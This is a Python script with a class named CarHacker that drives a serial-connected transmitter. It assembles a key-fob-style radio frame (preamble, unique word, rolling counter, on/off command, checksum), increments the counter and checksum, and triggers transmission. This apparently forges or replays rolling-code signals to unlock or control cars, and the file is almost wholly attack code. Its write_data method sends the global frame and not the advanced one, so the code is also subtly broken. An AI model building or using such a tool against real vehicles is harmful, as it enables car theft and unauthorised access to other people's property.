from time import sleep
from serial import Serial

CMD_RUN         = b'R'
CMD_REC_DATA    = b'D'
CMD_SET_TIME    = b'T'

data = []
data += [1,1]                               # Preamble 2bit  [0:1]
data += [1,0,1,0,1,0,1,1,0,1,1,0]           # UW       12bit [2:13]
data += [1,1,0,1,0,1,0,1,0,0,0,1,0,1,1,0]   # counter  16bit [14:29]
data += [0,0,0,1]                           # on/off   4bit  [30:33]
data += [0,0,0,0,0,0,0,0]                   #zeros     8bit  [34:41]
data += [0,0,0,0,0,0,0,0]                   #checksum  8bit  [42:49]
data += [0,0]                               #ending    2bit  [50:51]

class CarHacker:
    def __init__(self, comport: str, data=None) -> None:
        self.s = Serial(comport, 115200)
        if data != None:
            self.data = data

    def nice_print(self, line):
        print(line.decode('utf-8'))

    def nice_read_all(self):
        print(self.s.read_all().decode('utf-8'))

    def nice_readline(self):
        line = self.s.readline()
        self.nice_print(line)

    def advance_counter(self):
        if self.data == None:
            raise(Exception("data wasn't entered"))
        counter = self.data[14:30]
        counter_adv = self._int_to_list( self._list_to_int(counter) + 1,16)
        self.data[14:30] = counter_adv
    
    def advance_checksum(self):
        if self.data == None:
            raise(Exception("data wasn't entered"))
        checksum = self.data[42:50]
        checksum_adv = self._int_to_list( self._list_to_int(checksum) + 1,8)
        self.data[42:50] = checksum_adv

    
    def _list_to_int(self, arr: list) -> int:
        num = 0
        for i in arr:
            num = num << 1
            num += i 

        return num
    
    def _int_to_list(self, num: int, length: int) -> list:
        arr = []
        for i in range(length):
            arr = [num&1] + arr
            num = num >>1

        return arr




    def write_data(self):
        self.nice_read_all()
        self.s.write(CMD_REC_DATA)
        self.nice_readline()
        for bit in data:
            self.s.write(bit.to_bytes(1,'little'))
            self.nice_readline()

    def set_time(self, time: int):
        self.s.write(CMD_SET_TIME)
        self.s.write(time.to_bytes(4,'big'))
        line = self.s.readline()
        self.nice_print(line)

    def run(self):
        self.nice_read_all()
        self.s.write(CMD_RUN)
        self.nice_readline() # transmit flag change
        self.nice_readline() # start transmitting
        self.nice_readline() # wait for done
        
    